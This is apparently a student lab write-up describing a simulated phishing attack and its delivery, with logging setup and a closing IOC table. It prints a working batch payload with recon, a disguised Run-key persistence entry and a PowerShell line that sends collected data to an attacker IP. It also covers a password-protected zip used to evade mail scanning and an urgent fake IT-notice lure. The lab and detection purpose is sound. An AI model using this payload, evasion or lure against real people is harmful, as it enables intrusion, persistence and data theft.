# Phase 1 - Simulation

## Overview

This phase documents how the phishing attack was constructed and delivered to the victim machine. The goal was to simulate a realistic attack scenario covering email delivery, payload crafting, and social engineering techniques used by real threat actors.

---

## Lab Environment

| Machine | Role | OS | Tool |
|---|---|---|---|
| Ubuntu VM (VirtualBox) | Attacker | Ubuntu 24 | swaks, netcat |
| Windows Laptop | Victim | Windows 11 Home | Outlook, Splunk |

Both machines connected on the same bridged network - simulating an attacker and victim on the same LAN.

---

## Step 1 - Enabling Audit Logging on Victim

Before the attack was launched, process creation logging was enabled on the victim machine to ensure all events would be captured.

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

Verified with:

```powershell
auditpol /get /subcategory:"Process Creation"
```

Expected output:
Process Creation    Success and Failure

**Why this matters:** Without this setting, Windows does not log Event ID 4688 (process creation) - meaning the entire attack chain would be invisible to any SIEM or log analysis tool.

---

## Step 2 - Crafting the Payload

The malicious payload was created on the attacker machine (Ubuntu VM) as a Windows batch script. It was designed to simulate three phases of a real attack in sequence.

```batch
@echo off

REM === PHASE 1: RECON ===
whoami > "%USERPROFILE%\incident_log.txt"
systeminfo >> "%USERPROFILE%\incident_log.txt"
ipconfig >> "%USERPROFILE%\incident_log.txt"
net user >> "%USERPROFILE%\incident_log.txt"
net localgroup administrators >> "%USERPROFILE%\incident_log.txt"

REM === PHASE 2: PERSISTENCE ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /t REG_SZ /d "%USERPROFILE%\invoice_report.bat" /f

REM === PHASE 3: C2 + EXFILTRATION ===
powershell -c "$data = Get-Content '%USERPROFILE%\incident_log.txt' | Out-String; $client = New-Object Net.Sockets.TCPClient('192.168.0.24', 4444); $stream = $client.GetStream(); $bytes = [System.Text.Encoding]::UTF8.GetBytes($data); $stream.Write($bytes, 0, $bytes.Length); $client.Close()"
```

**Phase breakdown:**

| Phase | Commands Used | Purpose |
|---|---|---|
| Recon | whoami, systeminfo, ipconfig, net user, net localgroup | Profile the victim machine |
| Persistence | reg add HKCU\...\Run | Survive reboot - execute on every login |
| C2 + Exfil | PowerShell TCPClient | Send collected data to attacker machine |


---

## Step 4 - Disguising the Payload

Email security filters block `.bat` file attachments. To bypass this:

**Compress into a password-protected zip:**
```bash
zip -P infected invoice_report.zip invoice_report.bat
```

**Why password protection?** Email scanners cannot inspect the contents of a password-protected archive - a widely used technique by real threat actors to bypass attachment scanning.

The victim would be instructed via the email body to extract using the password before opening - classic social engineering.

---

## Step 5 - Setting Up the C2 Listener

Before sending the email, a netcat listener was started on the attacker machine to receive the incoming C2 connection from the victim.

```bash
nc -lvp 4444
```

This simulates a real attacker waiting for their implant to call home after execution.

---

## Step 6 - Crafting and Sending the Phishing Email

The phishing email was crafted to impersonate a legitimate IT notice, creating urgency to trick the victim into opening the attachment.

```
From:    amahalaxmiarulljothi@hawk.illinoistech.edu

To:      tgandhi3@hawk.illinoistech.edu

Subject: April invoice report

Dear User,
Please review the attached account activity report immediately. Your account shows multiple suspicious login attempts. Extract the attachment using password: pass123

IT Security Team
```

The email was sent via Microsoft Outlook between two university email accounts 

**Why this bypassed filters:**
- Both accounts on the same trusted tenant - treated as internal mail
- Password-protected zip prevented attachment scanning
- Low spam confidence score (SCL: 1) assigned despite DKIM, DMARC, and SPF failures

---

## Step 7 - Execution on Victim Machine

The victim received the email, extracted the zip using the provided password, and executed the batch file. Within milliseconds the payload completed all three phases - recon, persistence, and C2 - and the attacker machine received the connection.
Connection received on Theepan_Hrithik.ht.home 54800

The entire kill chain from execution to exfiltration completed in under 5 seconds.

---

## Payload IOCs

| Type | Value |
|---|---|
| Filename | invoice_report.bat |
| SHA256 | d8d89dba02219e4d3014a0fa4bdf9e671e2891b95cbf0d4381d595f9c02d06d8 |
| Attacker IP | 192.168.0.24 |
| C2 Port | 4444 (TCP) |
| Persistence Key | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater |
